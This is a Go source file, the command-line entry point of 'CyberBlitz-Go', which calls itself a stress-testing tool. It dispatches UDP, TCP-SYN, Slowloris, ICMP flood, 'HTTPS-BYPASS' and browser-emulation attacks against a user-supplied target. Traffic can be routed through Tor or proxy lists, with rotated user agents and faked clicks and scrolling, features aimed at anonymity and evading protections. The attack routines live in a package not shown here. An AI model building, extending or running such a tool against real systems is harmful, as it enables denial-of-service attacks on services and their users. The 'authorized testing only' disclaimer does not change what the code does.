package main

import (
	"context"
	"cyberblitz-go/pkg/attacks"
	"cyberblitz-go/pkg/utils"
	"fmt"
	"os"
	"os/signal"

	"github.com/spf13/cobra"
)

var (
	target      string
	port        int
	duration    int
	threads     int
	method      string
	useProxy    bool
	proxyFile   string
	proxyType   string
	useTor      bool
	uaSource    string
	uaFile      string
	clicks      bool
	scroll      bool
	skipConfirm bool
)

var rootCmd = &cobra.Command{
	Use:   "cyberblitz-go",
	Short: "CyberBlitz-Go is an advanced stress testing tool",
	Long: `A powerful and flexible stress testing tool rewritten in Go.
This tool is intended for educational purposes and authorized stress testing only.`,
	Run: func(cmd *cobra.Command, args []string) {
		fmt.Println("--- CyberBlitz-Go ---")
		fmt.Println("Attack Parameters:")
		fmt.Printf("  Target: %s\n", target)
		fmt.Printf("  Port: %d\n", port)
		fmt.Printf("  Duration: %d seconds\n", duration)
		fmt.Printf("  Threads: %d\n", threads)
		fmt.Printf("  Method: %s\n", method)
		fmt.Printf("  Use Proxy: %v\n", useProxy)
		if useProxy {
			fmt.Printf("    Proxy File: %s\n", proxyFile)
			fmt.Printf("    Proxy Type: %s\n", proxyType)
		}
		fmt.Printf("  Use Tor: %v\n", useTor)
		fmt.Printf("  User-Agent Source: %s\n", uaSource)
		if uaSource == "file" {
			fmt.Printf("    User-Agent File: %s\n", uaFile)
		}
		fmt.Println("Browser Emulation:")
		fmt.Printf("  Enable Clicks: %v\n", clicks)
		fmt.Printf("  Enable Scroll: %v\n", scroll)

		fmt.Printf("\nSkip Confirmation: %v\n", skipConfirm)

		// Dispatch attack logic based on the method
		fmt.Println("\nDispatching attack...")
		dispatchAttack()
	},
}

func dispatchAttack() {
	// Create a context that can be cancelled.
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	// Set up a channel to listen for OS signals (like Ctrl+C).
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt)

	// Run a goroutine to wait for the signal.
	// When the signal is received, it cancels the context.
	go func() {
		<-sigChan
		fmt.Println("\nInterrupt signal received. Shutting down gracefully...")
		cancel()
	}()

	var proxies []string
	var err error

	if useTor {
		fmt.Println("Using Tor SOCKS5 proxy...")
		proxies = []string{"socks5://127.0.0.1:9050"}
	} else if useProxy {
		fmt.Printf("Loading proxies from %s...\n", proxyFile)
		proxies, err = utils.LoadProxiesFromFile(proxyFile)
		if err != nil {
			fmt.Printf("Error: %v\n", err)
			return
		}
		fmt.Printf("Loaded %d proxies.\n", len(proxies))
	}

	switch method {
	case "UDP":
		attacks.UDPFlood(ctx, target, port, duration, threads)
	case "TCP-SYN":
		attacks.TCPFlood(ctx, target, port, duration, threads, method)
	case "SLOWLORIS":
		attacks.SlowLorisAttack(ctx, target, port, duration, threads)
	case "ICMP-FLOOD":
		attacks.ICMPFlood(ctx, target, duration, threads)
	case "HTTPS-BYPASS":
		attacks.TLSAttack(ctx, target, duration, threads, proxies, proxyType)
	case "HTTP-BROWSER":
		attacks.BrowserAttack(ctx, target, duration, threads)
	default:
		fmt.Printf("Attack method '%s' is not yet implemented.\n", method)
	}
}

func main() {
	if err := rootCmd.Execute(); err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
}

func init() {
	// Required flags
	rootCmd.Flags().StringVar(&target, "target", "", "Target URL or IP address (required)")
	rootCmd.Flags().StringVar(&method, "method", "", "Attack method (required)")
	rootCmd.MarkFlagRequired("target")
	rootCmd.MarkFlagRequired("method")

	// General attack options
	rootCmd.Flags().IntVar(&port, "port", 80, "Target port")
	rootCmd.Flags().IntVar(&duration, "duration", 10, "Duration of the attack in seconds")
	rootCmd.Flags().IntVar(&threads, "threads", 50, "Number of attack threads")

	// Proxy options
	rootCmd.Flags().BoolVar(&useProxy, "use-proxy", false, "Enable proxy usage")
	rootCmd.Flags().StringVar(&proxyFile, "proxy-file", "proxies.txt", "Path to proxy file")
	rootCmd.Flags().StringVar(&proxyType, "proxy-type", "socks5", "Proxy type (http, https, socks4, socks5)")

	// Tor options
	rootCmd.Flags().BoolVar(&useTor, "use-tor", false, "Enable Tor for anonymization")

	// User-Agent options
	rootCmd.Flags().StringVar(&uaSource, "user-agent-source", "generate", "Source for User-Agents ('generate' or 'file')")
	rootCmd.Flags().StringVar(&uaFile, "user-agent-file", "user_agents.txt", "Path to User-Agent file (if source is 'file')")

	// Browser emulation options
	rootCmd.Flags().BoolVar(&clicks, "clicks", false, "Enable random clicks in browser-based attacks")
	rootCmd.Flags().BoolVar(&scroll, "scroll", false, "Enable random scrolling in browser-based attacks")

	// Other options
	rootCmd.Flags().BoolVarP(&skipConfirm, "yes", "y", false, "Skip confirmation prompts")
}
